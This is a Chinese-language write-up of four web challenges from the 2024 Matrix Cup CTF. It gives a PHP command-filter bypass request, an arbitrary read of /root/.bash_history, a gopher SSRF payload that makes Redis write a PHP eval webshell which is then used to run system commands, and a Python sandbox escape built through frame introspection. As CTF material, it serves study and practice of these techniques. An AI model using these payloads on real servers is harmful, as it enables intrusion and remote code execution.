# 2024-矩阵杯WebWriteUp

  
  
&lt;!--more--&gt;  
## easyweb  
访问`/flag.php`，发现源码`加密的代码.zip`  
下载下来，进行绕过  
```php  
  
      	&lt;?php  
      	if (isset($_GET[&#39;id&#39;]) &amp;&amp; floatval($_GET[&#39;id&#39;]) !== &#39;1&#39; &amp;&amp; $_GET[&#39;id&#39;] == 1)   
      	{  
      		echo &#39;welcome,admin&#39;;  
      		$_SESSION[&#39;admin&#39;] = True;  
      	}   
      	else   
      	{  
	        die(&#39;flag?&#39;);  
      	}  
      	?&gt;  
  
      	&lt;?php  
	     if ($_SESSION[&#39;admin&#39;])   
	     {  
	       if(isset($_POST[&#39;code&#39;]))  
	       {  
		       if(preg_match(&#34;/(ls|c|a|t| |f|i|n|d&#39;)/&#34;, $_POST[&#39;code&#39;])==1)  
			       echo &#39;no!&#39;;  
		       elseif(preg_match(&#34;/[@#%^&amp;*()|\/?&gt;&lt;&#39;]/&#34;,$_POST[&#39;code&#39;])==1)  
			       echo &#39;no!&#39;;  
			else  
				system($_POST[&#39;code&#39;]);  
	       }  
	     }  
	     ?&gt;  
```  
```http  
POST /index.php?id=0.999999999999999999 HTTP/1.1  
Host: web-fe24daddc0.challenge.xctf.org.cn  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36  
Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Accept-Encoding: gzip, deflate, br  
Accept-Language: zh-CN,zh;q=0.9  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 12  
  
code=l&#34;&#34;s%0a  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011038609.png)
访问`/7l8g`得到`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011039889.png)
## where  
`/look?file=`存在任意文件读取，读取`/root/.bash_history`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011040218.png)
## tantantan  
访问`/aaabbb.php`  
`POST data=file:///var/www/html/aaabbb.php` 读取源码  
```php  
&lt;?php  
error_reporting(0);  
// error_reporting(E_ALL &amp; ~E_WARNING);  
// highlight_file(__FILE__);  
$url=$_POST[&#39;data&#39;];  
$ch=curl_init($url);  
curl_setopt($ch, CURLOPT_HEADER, 0);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
$result=curl_exec($ch);  
curl_close($ch);  
echo ($result);  
?&gt;  
```  
`dict://127.0.0.1:6379`发现存在`redis`服务  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011100756.png)
利用`gopher`打`redis`  
```http  
POST /aaabbb.php HTTP/1.1  
Host: web-da58846781.challenge.xctf.org.cn  
Content-Length: 26  
Cache-Control: max-age=0  
Upgrade-Insecure-Requests: 1  
Origin: http://web-da58846781.challenge.xctf.org.cn  
Content-Type: application/x-www-form-urlencoded  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36  
Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Referer: http://web-da58846781.challenge.xctf.org.cn//aaabbb.php  
Accept-Encoding: gzip, deflate, br  
Accept-Language: zh-CN,zh;q=0.9  
Connection: close  
  
data=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_REQUEST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A  
```  
生成`shell.php`  
访问`/shell.php?1=system(&#39;cat /9jsh267sbh1312h7dn2&#39;);`  
获得`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011105893.png)
## WHAT_CAN_I_SAY  
有一些过滤，先把它注释掉，然后进行绕过  
```python  
#!/usr/local/bin/python3  
# First Line of docker file -&gt; FROM ubuntu:23.04  
  
import os  
import subprocess  
import sys  
from tempfile import TemporaryDirectory  
  
WELCOME = r&#39;&#39;&#39;  
  
 __          ___    _       _______    _____          _   _   _____    _____     __     __  
 \ \        / / |  | |   /\|__   __|  / ____|   /\   | \ | | |_   _|  / ____|  /\\ \   / /  
  \ \  /\  / /| |__| |  /  \  | |    | |       /  \  |  \| |   | |   | (___   /  \\ \_/ /   
   \ \/  \/ / |  __  | / /\ \ | |    | |      / /\ \ | . ` |   | |    \___ \ / /\ \\   /    
    \  /\  /  | |  | |/ ____ \| |    | |____ / ____ \| |\  |  _| |_   ____) / ____ \| |     
     \/  \/   |_|  |_/_/    \_\_|     \_____/_/    \_\_| \_| |_____| |_____/_/    \_\_|     
                                                                                            
&#39;&#39;&#39;  
  
basecode = &#39;&#39;&#39;  
# safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in &#34;_-abcdefghijklmnopqrstuvwxyz&#34;}  
# del __builtins__  
# try:exec(code,safebuiltins_dict,{})  
# except:pass  
exec(code)  
&#39;&#39;&#39;  
  
def main(workdir):  
    print(&#34;Make `input equals output` but with some rules!&#34;)  
    print(&#34;1. Not allow to use some special chars -&gt; like unicode&#34;)  
    print(&#34;2. Code length less than 666&#34;)  
    print(&#34;3. Make sure &#39;what.can.i.say&#39; in your code that makes Kobe like you!&#34;)  
    print(&#34;4. Pls input your code which end with &lt;EOF&gt;&#34;)  
    print(&#34;Good luck!&#34;)  
  
    os.chdir(workdir)  
    os.mkdir(&#34;runsbox&#34;)  
  
    code = &#34;&#34;  
    tmp_input = []  
    while (x := input(&#34;&gt;&gt;&gt; &#34;)) != &#34;&lt;EOF&gt;&#34;:  
        tmp_input.append(x)  
    code = &#34;\n&#34;.join(m for m in tmp_input)  
  
    # assert 0 &lt; len(code) &lt; 666, &#34;Boy your code is too long!!!!!&#34;  
    # assert all(i not in code for i in list(&#34;&#39;\&#34;_{}#&#34;)), &#34;I don&#39;t like those chars...&#34;  
    # assert &#34;import&#34; not in code,&#34;Boy, this isn&#39;t funny!&#34;  
    # assert &#34;what.can.i.say&#34; in code, &#34;Mamba out!&#34;  
    # assert all(10 &lt;= ord(c) &lt;= 127 for c in code), &#34;pls using ascii code boy!&#34;  
  
    try:  
        with open(&#34;runbox.py&#34;, &#34;w&#43;&#34;) as f:  
            f.write(f&#34;&#34;&#34;#!/usr/local/bin/python3  
{code = }  
{basecode}  
&#34;&#34;&#34;)  
        runsbx_handle = subprocess.run(  
            &#34;/usr/bin/python3 runbox.py&#34;,  
            shell=True,  
            capture_output=True,  
            encoding=&#34;utf-8&#34;,  
        )  
    except Exception:  
        sys.stderr.write(&#34;run sandbox error!\n&#34;)  
        os._exit(0)  
  
    if (  
        len(runsbx_handle.stdout)  
        and len(runsbx_handle.stderr)  
        and runsbx_handle.stdout == runsbx_handle.stderr == code  
    ):  
        # with open(&#34;/fake_local_flag_path_but_real_into_remote_xxxxxxxxxxxx&#34;) as f:  
        #     sys.stdout.write(f.read())  
        print(&#34;bypass&#34;)  
    else:  
        sys.stderr.write(&#34;Man what can i say?\n&#34;)  
  
  
if __name__ == &#34;__main__&#34;:  
    print(WELCOME)  
    with TemporaryDirectory() as workdir:  
        main(workdir)  
```  
参考文章  
https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c  
https://xz.aliyun.com/t/13635  
```exp  
a=(a.gi_frame.f_back.f_back for i in [1])  
a=[x for x in a][0]  
globals=a.f_back.f_globals  
code = globals[&#39;code&#39;]  
exec(&#39;__import__(&#34;sys&#34;).stdout.write(code)&#39;)  
exec(&#39;__import__(&#34;sys&#34;).stderr.write(code)&#39;)  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021531645.png)
接下来想办法绕过如下两处代码  
```python  
safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in &#34;_-abcdefghijklmnopqrstuvwxyz&#34;}  
del __builtins__  
try:exec(code,safebuiltins_dict,{})  
except:pass  
  
    assert 0 &lt; len(code) &lt; 666, &#34;Boy your code is too long!!!!!&#34;  
    assert all(i not in code for i in list(&#34;&#39;\&#34;_{}#&#34;)), &#34;I don&#39;t like those chars...&#34;  
    assert &#34;import&#34; not in code,&#34;Boy, this isn&#39;t funny!&#34;  
    assert &#34;what.can.i.say&#34; in code, &#34;Mamba out!&#34;  
    assert all(10 &lt;= ord(c) &lt;= 127 for c in code), &#34;pls using ascii code boy!&#34;  
```  
先看第一处  
```python  
safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in &#34;_-abcdefghijklmnopqrstuvwxyz&#34;}  
del __builtins__  
try:exec(code,safebuiltins_dict,{})  
except:pass  
```  
这个过滤大概意思就是删除了`__builtins__`，但是保留了一些函数  
第二处  
```python  
    assert 0 &lt; len(code) &lt; 666, &#34;Boy your code is too long!!!!!&#34;  
    assert all(i not in code for i in list(&#34;&#39;\&#34;_{}#&#34;)), &#34;I don&#39;t like those chars...&#34;  
    assert &#34;import&#34; not in code,&#34;Boy, this isn&#39;t funny!&#34;  
    assert &#34;what.can.i.say&#34; in code, &#34;Mamba out!&#34;  
    assert all(10 &lt;= ord(c) &lt;= 127 for c in code), &#34;pls using ascii code boy!&#34;  
```  
限制了code的长度在0-666之前，并且限制了一些特殊字符`&#39;\&#34;_{}#`，并且ascii码需要在10-127之前，包含`what.can.i.say`  
构造`exp`  
```python  
g=chr(103)  
i=chr(105)  
k=chr(95)  
f=chr(102)  
r=chr(114)  
a=chr(97)  
m=chr(109)  
e=chr(101)  
b=chr(98)  
c=chr(99)  
l=chr(108)  
o=chr(111)  
s=chr(115)  
d=chr(100)  
k1=chr(107)  
p=chr(112)  
t=chr(116)  
t1=chr(40)  
t2=chr(34)  
t3=chr(41)  
y=chr(121)  
d1=chr(46)  
u=chr(117)  
w=chr(119)  
G=g&#43;i&#43;k&#43;f&#43;r&#43;a&#43;m&#43;e   
F=f&#43;k&#43;b&#43;a&#43;c&#43;k1  
GL=f&#43;k&#43;g&#43;l&#43;o&#43;b&#43;a&#43;l&#43;s  
CO=c&#43;o&#43;d&#43;e  
i1=k&#43;k&#43;i&#43;m&#43;p&#43;o&#43;r&#43;t&#43;k&#43;k&#43;t1&#43;t2&#43;s&#43;y&#43;s&#43;t2&#43;t3&#43;d1&#43;s&#43;t&#43;d  
u=o&#43;u&#43;t  
i2=d1&#43;w&#43;r&#43;i&#43;t&#43;e&#43;t1&#43;a&#43;t3  
r=e&#43;r&#43;r  
def a():  
    global G,F,GL,CO  
    def b():  
        yield getattr(getattr(getattr(c,G),F),F)  
    c = b()  
    z = getattr(getattr(next(c),F),GL)[CO]  
    return z  
a = a()  
exec(i1&#43;u&#43;i2)  
exec(i1&#43;r&#43;i2)  
try:  
    what.can.i.say  
except:  
    pass  
```  
成功绕过  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021732519.png)
`exp.py`  
```python  
import subprocess  
import os  
import sys  
code = &#39;&#39;&#39;  
g=chr(103)  
i=chr(105)  
k=chr(95)  
f=chr(102)  
r=chr(114)  
a=chr(97)  
m=chr(109)  
e=chr(101)  
b=chr(98)  
c=chr(99)  
l=chr(108)  
o=chr(111)  
s=chr(115)  
d=chr(100)  
k1=chr(107)  
p=chr(112)  
t=chr(116)  
t1=chr(40)  
t2=chr(34)  
t3=chr(41)  
y=chr(121)  
d1=chr(46)  
u=chr(117)  
w=chr(119)  
G=g&#43;i&#43;k&#43;f&#43;r&#43;a&#43;m&#43;e   
F=f&#43;k&#43;b&#43;a&#43;c&#43;k1  
GL=f&#43;k&#43;g&#43;l&#43;o&#43;b&#43;a&#43;l&#43;s  
CO=c&#43;o&#43;d&#43;e  
i1=k&#43;k&#43;i&#43;m&#43;p&#43;o&#43;r&#43;t&#43;k&#43;k&#43;t1&#43;t2&#43;s&#43;y&#43;s&#43;t2&#43;t3&#43;d1&#43;s&#43;t&#43;d  
u=o&#43;u&#43;t  
i2=d1&#43;w&#43;r&#43;i&#43;t&#43;e&#43;t1&#43;a&#43;t3  
r=e&#43;r&#43;r  
def a():  
    global G,F,GL,CO  
    def b():  
        yield getattr(getattr(getattr(c,G),F),F)  
    c = b()  
    z = getattr(getattr(next(c),F),GL)[CO]  
    return z  
a = a()  
exec(i1&#43;u&#43;i2)  
exec(i1&#43;r&#43;i2)  
try:  
    what.can.i.say  
except:  
    pass  
&#39;&#39;&#39;  
basecode = &#39;&#39;&#39;  
safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in &#34;_-abcdefghijklmnopqrstuvwxyz&#34;}  
del __builtins__  
try:exec(code,safebuiltins_dict,{})  
except Exception as e:print(e)  
&#39;&#39;&#39;  
assert 0 &lt; len(code) &lt; 666, &#34;Boy your code is too long!!!!!&#34;  
assert all(i not in code for i in list(&#34;&#39;\&#34;_{}#&#34;)), &#34;I don&#39;t like those chars...&#34;  
assert &#34;import&#34; not in code,&#34;Boy, this isn&#39;t funny!&#34;  
assert &#34;what.can.i.say&#34; in code, &#34;Mamba out!&#34;  
assert all(10 &lt;= ord(c) &lt;= 127 for c in code), &#34;pls using ascii code boy!&#34;  
try:  
        with open(&#34;./runbox1.py&#34;, &#34;w&#43;&#34;) as f:  
            f.write(f&#34;&#34;&#34;#!/usr/local/bin/python3  
{code = }  
{basecode}  
&#34;&#34;&#34;)  
        runsbx_handle = subprocess.run(  
            &#34;/usr/bin/python3 ./runbox1.py&#34;,  
            shell=True,  
            capture_output=True,  
            encoding=&#34;utf-8&#34;,  
        )  
except Exception:  
        sys.stderr.write(&#34;run sandbox error!\n&#34;)  
        os._exit(0)  
if (  
        len(runsbx_handle.stdout)  
        and len(runsbx_handle.stderr)  
        and runsbx_handle.stdout == runsbx_handle.stderr == code  
    ):  
        # with open(&#34;/fake_local_flag_path_but_real_into_remote_xxxxxxxxxxxx&#34;) as f:  
        #     sys.stdout.write(f.read())  
        print(&#34;bypass&#34;)  
else:  
        sys.stderr.write(&#34;Man what can i say?\n&#34;)  
```  

---

> Author: N1Rvana  
> URL: http://localhost:1313/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/  

